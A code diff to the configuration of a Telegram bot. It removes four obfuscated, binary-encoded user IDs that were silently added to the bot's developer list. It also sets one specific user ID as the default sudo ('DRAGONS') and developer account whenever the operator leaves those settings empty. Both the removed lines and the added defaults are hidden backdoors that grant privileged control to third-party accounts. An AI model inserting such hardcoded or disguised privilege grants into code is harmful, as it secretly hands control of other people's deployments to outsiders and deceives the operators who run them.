@@ -68,8 +68,8 @@ if ENV:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
     try:
-        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
+        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "1086365745").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "1086365745").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -145,11 +145,6 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(abs(0b1111111110110111000100101010100))
-DEV_USERS.add(abs(0b1100110111010001011110110001010))
-DEV_USERS.add(abs(0b101001110110010000111010111110000))
-DEV_USERS.add(abs(0b101100001110010100011000111101001))
-
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 telethn = TelegramClient("mukesh", API_ID, API_HASH)
